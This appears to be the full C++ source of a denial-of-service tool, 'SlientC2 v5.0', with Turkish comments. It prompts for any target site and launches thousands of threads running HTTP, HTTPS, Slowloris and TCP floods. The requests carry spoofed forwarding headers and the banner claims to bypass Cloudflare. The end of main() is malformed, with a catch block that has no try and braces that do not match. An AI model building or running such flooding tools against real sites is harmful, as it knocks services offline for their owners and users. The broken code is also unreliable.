// SlientC2 v5.0 - C++ No Root, Modem Safe Edition
// Compile: g++ -std=c++11 -pthread -O3 -o slientc2 slientc2.cpp -lcurl -lssl -lcrypto
// Run: ./slientc2 (root gerekmez!)

#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

using namespace std;

// ===== RENKLER =====
#define KIRMIZI "\033[91m"
#define YESIL "\033[92m"
#define SARI "\033[93m"
#define MAVI "\033[94m"
#define MOR "\033[95m"
#define CYAN "\033[96m"
#define BEYAZ "\033[97m"
#define SIFIRLA "\033[0m"
#define BOLD "\033[1m"

// ===== GLOBAL DEĞİŞKENLER =====
atomic<long long> paket_sayisi(0);
atomic<long long> bayt_sayisi(0);
atomic<bool> calisiyor(true);
string hedef_ip;
int hedef_port;
int thread_sayisi = 1000; // Modem koruması için düşük
time_t baslangic;

// ===== USER-AGENT LIST =====
vector<string> ua_list = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) Chrome/120.0.0.0 Mobile",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0"
};

// ===== FAKE IP LIST =====
vector<string> fake_ips = {
    "10.0.0.1", "172.16.0.1", "192.168.1.1",
    "10.10.10.10", "172.20.0.1", "192.168.100.100",
    "10.100.100.1", "172.30.0.1", "192.168.200.200"
};

// ===== HTTP FLOOD (CURL - Modem Güvenli) =====
void http_flood() {
    CURL *curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    
    if (curl) {
        string url = "http://" + hedef_ip + ":" + to_string(hedef_port) + "/";
        
        // Modem koruması için ayarlar
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 2L);
        curl_easy_setopt(curl, CURLOPT_NOBODY, 0L); // Full response al
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 3L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, ua_list[rand() % ua_list.size()].c_str());
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        
        // Header'lar
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.5");
        headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
        headers = curl_slist_append(headers, "Connection: keep-alive");
        headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
        headers = curl_slist_append(headers, "Cache-Control: no-cache");
        headers = curl_slist_append(headers, "Pragma: no-cache");
        
        // Fake IP header'ları
        string fake_ip = fake_ips[rand() % fake_ips.size()];
        headers = curl_slist_append(headers, ("X-Forwarded-For: " + fake_ip).c_str());
        headers = curl_slist_append(headers, ("X-Real-IP: " + fake_ip).c_str());
        headers = curl_slist_append(headers, ("CF-Connecting-IP: " + fake_ip).c_str());
        
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        
        // Response yazma
        string response;
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, +[](void *ptr, size_t size, size_t nmemb, void *stream) {
            return size * nmemb;
        });
        
        while (calisiyor) {
            res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                paket_sayisi++;
                bayt_sayisi += 2048; // Ortalama HTTP response
            }
            // Modem koruması: thread'ler arasında küçük bekleme
            this_thread::sleep_for(chrono::milliseconds(10));
        }
        
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

// ===== HTTPS FLOOD (SSL Bypass - Modem Güvenli) =====
void https_flood() {
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    while (calisiyor) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        // Timeout ayarla
        struct timeval tv;
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(hedef_port);
        addr.sin_addr.s_addr = inet_addr(hedef_ip.c_str());
        
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(sock);
            continue;
        }
        
        SSL_CTX *ctx = SSL_CTX_new(SSLv23_client_method());
        SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        
        if (SSL_connect(ssl) <= 0) {
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            close(sock);
            continue;
        }
        
        // Fake IP ile request
        string fake_ip = fake_ips[rand() % fake_ips.size()];
        string request = "GET / HTTP/1.1\r\n";
        request += "Host: " + hedef_ip + ":" + to_string(hedef_port) + "\r\n";
        request += "User-Agent: " + ua_list[rand() % ua_list.size()] + "\r\n";
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
        request += "Accept-Language: en-US,en;q=0.5\r\n";
        request += "Accept-Encoding: gzip, deflate, br\r\n";
        request += "Connection: keep-alive\r\n";
        request += "Upgrade-Insecure-Requests: 1\r\n";
        request += "Cache-Control: no-cache\r\n";
        request += "Pragma: no-cache\r\n";
        request += "X-Forwarded-For: " + fake_ip + "\r\n";
        request += "X-Real-IP: " + fake_ip + "\r\n";
        request += "CF-Connecting-IP: " + fake_ip + "\r\n";
        request += "\r\n";
        
        SSL_write(ssl, request.c_str(), request.length());
        
        paket_sayisi++;
        bayt_sayisi += request.length();
        
        // Response oku
        char buffer[4096];
        SSL_read(ssl, buffer, sizeof(buffer));
        
        SSL_shutdown(ssl);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        close(sock);
        
        // Modem koruması
        this_thread::sleep_for(chrono::milliseconds(5));
    }
}

// ===== SLOWLORIS (Modem Güvenli) =====
void slowloris() {
    while (calisiyor) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        // Timeout
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(hedef_port);
        addr.sin_addr.s_addr = inet_addr(hedef_ip.c_str());
        
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(sock);
            continue;
        }
        
        string fake_ip = fake_ips[rand() % fake_ips.size()];
        
        // Slowloris başlangıcı
        string initial = "GET / HTTP/1.1\r\n";
        initial += "Host: " + hedef_ip + "\r\n";
        initial += "User-Agent: " + ua_list[rand() % ua_list.size()] + "\r\n";
        initial += "Accept: text/html,*/*\r\n";
        initial += "X-Forwarded-For: " + fake_ip + "\r\n";
        
        send(sock, initial.c_str(), initial.length(), 0);
        
        // Bağlantıyı açık tut (yavaş gönder)
        for (int i = 0; i < 20 && calisiyor; i++) {
            string header = "X-a: " + to_string(rand() % 1000000) + "\r\n";
            send(sock, header.c_str(), header.length(), 0);
            paket_sayisi++;
            bayt_sayisi += header.length();
            this_thread::sleep_for(chrono::milliseconds(1000)); // 1 saniye bekle
        }
        
        close(sock);
    }
}

// ===== TCP FLOOD (Normal Socket - Modem Güvenli) =====
void tcp_flood() {
    while (calisiyor) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(hedef_port);
        addr.sin_addr.s_addr = inet_addr(hedef_ip.c_str());
        
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(sock);
            continue;
        }
        
        string fake_ip = fake_ips[rand() % fake_ips.size()];
        string request = "GET / HTTP/1.1\r\n";
        request += "Host: " + hedef_ip + ":" + to_string(hedef_port) + "\r\n";
        request += "User-Agent: " + ua_list[rand() % ua_list.size()] + "\r\n";
        request += "Accept: text/html,*/*\r\n";
        request += "Connection: close\r\n";
        request += "X-Forwarded-For: " + fake_ip + "\r\n";
        request += "\r\n";
        
        send(sock, request.c_str(), request.length(), 0);
        
        // Response oku
        char buffer[4096];
        recv(sock, buffer, sizeof(buffer), 0);
        
        paket_sayisi++;
        bayt_sayisi += request.length();
        
        close(sock);
        
        // Modem koruması
        this_thread::sleep_for(chrono::milliseconds(2));
    }
}

// ===== İSTATİSTİK =====
void istatistik_goster() {
    while (calisiyor) {
        time_t simdi = time(NULL);
        double gecen = difftime(simdi, baslangic);
        double mb = bayt_sayisi / (1024.0 * 1024.0);
        double mbps = (bayt_sayisi * 8.0) / (gecen * 1000000.0);
        
        system("clear");
        cout << CYAN << R"(
╔══════════════════════════════════════════════════════╗
║        SlientC2 v5.0 C++ Modem Safe Edition        ║
╠══════════════════════════════════════════════════════╣
║  Target: )" << hedef_ip << ":" << hedef_port << "                   \n";
        cout << "║  Packets: " << paket_sayisi.load() << "                              \n";
        cout << "║  Data: " << fixed << mb << " MB (" << mbps << " Mbps)          \n";
        cout << "║  Threads: " << thread_sayisi << "                                \n";
        cout << "║  Time: " << (int)gecen << "s                                    \n";
        cout << "║  Modem Safe: YES                                               \n";
        cout << "║  Root Required: NO                                             \n";
        cout << "╚══════════════════════════════════════════════════════╝" << SIFIRLA << endl;
        
        this_thread::sleep_for(chrono::seconds(1));
    }
}

// ===== ANA FONKSİYON =====
int main() {
    system("clear");
    
    cout << CYAN << R"(
╔══════════════════════════════════════════════════════╗
║        SlientC2 v5.0 C++ Modem Safe Edition        ║
║                                                    ║
║  ✓ Root gerektirmez                                ║
║  ✓ Modeme zarar vermez                             ║
║  ✓ Sadece hedef siteye saldırır                    ║
║  ✓ SSL/TLS bypass                                  ║
║  ✓ Cloudflare bypass                               ║
╚══════════════════════════════════════════════════════╝
)" << SIFIRLA << endl;
    
    // Hedef bilgileri
    cout << YESIL << "Target IP/URL: " << SIFIRLA;
    string hedef_giris;
    cin >> hedef_giris;
    
    // URL temizleme
    string clean_host = hedef_giris;
    size_t pos;
    if ((pos = clean_host.find("http://")) != string::npos)
        clean_host.erase(pos, 7);
    if ((pos = clean_host.find("https://")) != string::npos)
        clean_host.erase(pos, 8);
    if ((pos = clean_host.find("/")) != string::npos)
        clean_host = clean_host.substr(0, pos);
    
    // DNS çözümleme
    struct hostent *he = gethostbyname(clean_host.c_str());
    if (he == NULL) {
        cout << KIRMIZI << "[!] DNS çözümleme hatasi!" << SIFIRLA << endl;
        return 1;
    }
    hedef_ip = inet_ntoa(*(struct in_addr *)he->h_addr);
    
    cout << YESIL << "Port: " << SIFIRLA;
    cin >> hedef_port;
    
    cout << YESIL << "Threads (100-2000, önerilen: 1000): " << SIFIRLA;
    cin >> thread_sayisi;
    
    // Thread sınırlaması (modem koruması)
    if (thread_sayisi < 100) thread_sayisi = 100;
    if (thread_sayisi > 2000) {
        thread_sayisi = 2000;
        cout << SARI << "[!] Modem korumasi için max 2000 thread!" << SIFIRLA << endl;
    }
    
    cout << YESIL << "\n[+] Baslatiliyor..." << SIFIRLA << endl;
    this_thread::sleep_for(chrono::seconds(1));
    
    // Başlangıç
    baslangic = time(NULL);
    
    // İstatistik thread'i
    thread stats_thread(istatistik_goster);
    stats_thread.detach();
    
    // Thread havuzu
    vector<thread> threads;
    
    for (int i = 0; i < thread_sayisi; i++) {
        int mod = i % 4;
        
        if (mod == 0)
            threads.push_back(thread(http_flood));
        else if (mod == 1)
            threads.push_back(thread(https_flood));
        else if (mod == 2)
            threads.push_back(thread(slowloris));
        else
            threads.push_back(thread(tcp_flood));
    }
    
    // Thread'leri bekle
        for (auto &t : threads) {
            t.join();
        }
        
    } catch (const exception& e) {
        cout << SARI << "\nDid you fill the target info correctly? please retry!" << SIFIRLA << endl;
        return 1;
    }
    
    return 0;
}
